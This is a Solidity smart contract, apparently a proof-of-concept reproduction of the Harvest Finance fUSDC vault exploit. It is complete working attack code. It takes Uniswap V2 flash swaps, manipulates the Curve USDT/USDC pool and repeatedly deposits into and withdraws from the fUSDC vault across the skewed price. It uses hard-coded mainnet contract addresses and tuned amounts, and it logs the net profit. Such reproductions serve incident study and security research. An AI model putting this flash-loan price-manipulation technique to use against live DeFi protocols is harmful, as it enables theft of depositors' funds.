// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

import "../interfaces/IERC20.sol";
import "../interfaces/IUniswapV2/IUniswapV2Pair.sol";
import "../interfaces/IUniswapV2/IUniswapV2Callee.sol";
import "./IStrategy.sol";

interface ICurve {
    function exchange_underlying(
        int128 i,
        int128 j,
        uint256 dx,
        uint256 min_dy
    ) external;
}

interface IUSDT {
    function approve(address _spender, uint256 _value) external;
    function transfer(address _to, uint256 _value) external;
    function balanceOf(address _owner) external view returns (uint256);
}

interface IVault {
    function deposit(uint256) external;
    function withdraw(uint256) external;
    function balanceOf(address) external view returns (uint256);
    function underlying() external view returns (address);
    function depositArbCheck() external view returns(bool);
    function underlyingBalanceWithInvestment() external view returns (uint256);
    function underlyingBalanceInVault() external view returns (uint256);
    function getPricePerFullShare() external view returns (uint256);
}


contract HarvestAttack is IUniswapV2Callee {
    IUniswapV2Pair constant public uniswapUSDTPair = IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
    IUniswapV2Pair constant public uniswapUSDCPair = IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
    ICurve constant public curve = ICurve(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
    IUSDT constant public usdt = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 constant public usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IVault constant public fUSDC = IVault(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE);

    function test() external {
        usdt.approve(address(curve), type(uint256).max - 1);
        usdc.approve(address(curve), type(uint256).max - 1);
        usdc.approve(address(fUSDC), type(uint256).max - 1);

        uint usdtInitialBalance = usdt.balanceOf(address(this));
        uint usdcInitialBalance = usdc.balanceOf(address(this));

        uniswapUSDTPair.swap(0, 18308555417594, address(this), hex"3232");

        console.log("");
        console.log("=== NET PROFIT ===");
        console.log("USDT:", usdt.balanceOf(address(this)) - usdtInitialBalance);
        console.log("USDC:", usdc.balanceOf(address(this)) - usdcInitialBalance);
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
        bytes32 dataHash = keccak256(data);
        if (dataHash == keccak256(hex"3232")) {
            usdtCallback(sender, amount0, amount1);
        } else if (dataHash == keccak256(hex"333333")) {
            usdcCallback(sender, amount0, amount1);
        } else {
            revert("Unknown callback");
        }
    }

    function usdtCallback(address, uint, uint usdtAmount) internal {
        uniswapUSDCPair.swap(50000000000000, 0, address(this), hex"333333");

        uint256 returnAmountFee = (usdtAmount * 1000) / 997 + 1;
        usdt.transfer(msg.sender, returnAmountFee);
    }

    function usdcCallback(address, uint usdcAmount, uint) internal {
        uint usdtInitialBalance = usdt.balanceOf(address(this));
        uint usdcInitialBalance = usdc.balanceOf(address(this));

        console.log("");
        console.log("=== Before Attack ===");
        console.log("USDT:", usdtInitialBalance);
        console.log("USDC:", usdcInitialBalance);
        console.log("===");

        for (uint i = 0; i < 7; i++) {
            console.log("");
            console.log("=== Swap USDT -> USDC ===");

            uint usdtToSwap = usdt.balanceOf(address(this)) * 9425 / 10000;
            // uint usdtToSwap = 17222012640506;
            console.log("Amount USDT:", usdtToSwap);

            // USDT -> USDC
            curve.exchange_underlying(2, 1, usdtToSwap, 0);

            uint usdtSent = usdtInitialBalance - usdt.balanceOf(address(this));
            uint usdcReceived = usdc.balanceOf(address(this)) - usdcInitialBalance;

            console.log("USDT Sent:", usdtSent);
            console.log("USDC Received:", usdcReceived);
            console.log("USDT:", usdt.balanceOf(address(this)));
            console.log("USDC:", usdc.balanceOf(address(this)));
            console.log("===");

            console.log("");
            console.log("=== Deposit ===");

            console.log("Price per share:", fUSDC.getPricePerFullShare());

            // uint usdcToDeposit = 49977468555526;
            uint usdcToDeposit = (usdc.balanceOf(address(this)) - usdcReceived);
            console.log("Amount USDC:", usdcToDeposit);

            fUSDC.deposit(usdcToDeposit);

            console.log("USDC:", usdc.balanceOf(address(this)));
            console.log("USDT:", usdt.balanceOf(address(this)));
            console.log("USDC Shares:", fUSDC.balanceOf(address(this)));
            console.log("===");

            console.log("");
            console.log("=== Swap USDC -> USDT ===");

            uint256 usdcToSwap = usdc.balanceOf(address(this));
            console.log("Amount USDC:", usdcToSwap);

            uint256 usdcBalance = usdc.balanceOf(address(this));
            uint256 usdtBalance = usdt.balanceOf(address(this));

            // USDC -> USDT
            curve.exchange_underlying(1, 2, usdcToSwap, 0);

            console.log("USDT Received:", usdt.balanceOf(address(this)) - usdtBalance);
            console.log("USDC Sent:", usdcBalance - usdc.balanceOf(address(this)));
            console.log("USDT:", usdt.balanceOf(address(this)));
            console.log("USDC:", usdc.balanceOf(address(this)));

            console.log("===");

            console.log("");
            console.log("=== Withdraw ===");

            console.log("Price per share:", fUSDC.getPricePerFullShare());

            uint fusdcToWithdraw = fUSDC.balanceOf(address(this));
            console.log("Amount fUSDC:", fusdcToWithdraw);

            fUSDC.withdraw(fusdcToWithdraw);

            uint usdcShares = fUSDC.balanceOf(address(this));
            console.log("USDT:", usdt.balanceOf(address(this)));
            console.log("USDC:", usdc.balanceOf(address(this)));
            console.log("USDC Shares:", usdcShares);
            console.log("===");
        }

        console.log("");
        console.log("=== After attack ===");
        console.log("USDT:", usdt.balanceOf(address(this)));
        console.log("USDC:", usdc.balanceOf(address(this)));
        console.log("Diff USDT:", usdt.balanceOf(address(this)) - usdtInitialBalance);
        console.log("Diff USDC:", usdc.balanceOf(address(this)) - usdcInitialBalance);
        console.log("===");

        usdc.transfer(msg.sender, (usdcAmount * 1000) / 997 + 1);
    }
}